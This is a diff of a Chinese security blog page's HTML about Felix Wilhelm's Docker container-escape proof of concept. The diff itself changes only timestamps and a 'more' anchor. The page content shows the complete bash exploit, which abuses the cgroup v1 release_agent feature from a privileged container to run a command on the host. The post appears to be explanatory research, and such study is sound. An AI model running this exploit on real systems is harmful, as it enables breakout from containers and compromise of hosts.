@@ -30,7 +30,7 @@
 <meta property="og:description" content="Felix Wilhelm最近的一条关于概念验证(PoC)“容器逃逸”的推文激起了兴趣，因为进行了类似的研究，并好奇这个PoC会如何影响Kubernetes。  Felix’s poc on tweets  Felix的tweeter展示了一个漏洞，该漏洞从一个使用–privileged flag运行的Docker容器中启动主机上的进程。PoC通过滥用Linux cgroup v1的“发布通知”特">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-12-14T06:22:41.000Z">
-<meta property="article:modified_time" content="2020-12-14T06:32:35.195Z">
+<meta property="article:modified_time" content="2020-12-14T06:41:47.080Z">
 <meta property="article:author" content="lUc1f3r11">
 <meta property="article:tag" content="linux提权">
 <meta name="twitter:card" content="summary">
@@ -226,7 +226,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-12-14 14:22:41 / Modified: 14:32:35" itemprop="dateCreated datePublished" datetime="2020-12-14T14:22:41+08:00">2020-12-14</time>
+              <time title="Created: 2020-12-14 14:22:41 / Modified: 14:41:47" itemprop="dateCreated datePublished" datetime="2020-12-14T14:22:41+08:00">2020-12-14</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -275,6 +275,8 @@
 <li><span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9fZmVsMXgvc3RhdHVzLzExNTE0ODcwNTMzNzAxODc3NzY/cmVmX3NyYz10d3NyYyU1RXRmdyU3Q3R3Y2FtcCU1RXR3ZWV0ZW1iZWQlN0N0d3Rlcm0lNUUxMTUxNDg3MDUzMzcwMTg3Nzc2JTdDdHdnciU1RSU3Q3R3Y29uJTVFczFfJnJlZl91cmw9aHR0cHM6Ly9ibG9nLnRyYWlsb2ZiaXRzLmNvbS8yMDE5LzA3LzE5L3VuZGVyc3RhbmRpbmctZG9ja2VyLWNvbnRhaW5lci1lc2NhcGVzLw==">Felix’s poc on tweets<i class="fa fa-external-link-alt"></i></span></li>
 </ul>
 <p>Felix的tweeter展示了一个漏洞，该漏洞从一个使用–privileged flag运行的Docker容器中启动主机上的进程。PoC通过滥用Linux cgroup v1的“发布通知”特性来实现这一点。<br>下面是在主机上启动ps的PoC版本:</p>
+<a id="more"></a>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># spawn a new container to exploit via:</span></span><br><span class="line"><span class="comment"># docker run --rm -it --privileged ubuntu bash</span></span><br><span class="line"> </span><br><span class="line">d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`</span><br><span class="line">mkdir -p <span class="variable">$d</span>/w;<span class="built_in">echo</span> 1 &amp;gt;<span class="variable">$d</span>/w/notify_on_release</span><br><span class="line">t=`sed -n <span class="string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab`</span><br><span class="line">touch /o; <span class="built_in">echo</span> <span class="variable">$t</span>/c &amp;gt;<span class="variable">$d</span>/release_agent;<span class="built_in">printf</span> <span class="string">&#x27;#!/bin/sh\nps &amp;gt;&#x27;</span>&amp;quot;<span class="variable">$t</span>/o&amp;quot; &amp;gt;/c;</span><br><span class="line">chmod +x /c;sh -c &amp;quot;<span class="built_in">echo</span> 0 &amp;gt;<span class="variable">$d</span>/w/cgroup.procs&amp;quot;;sleep 1;cat /o</span><br></pre></td></tr></table></figure>
 
 
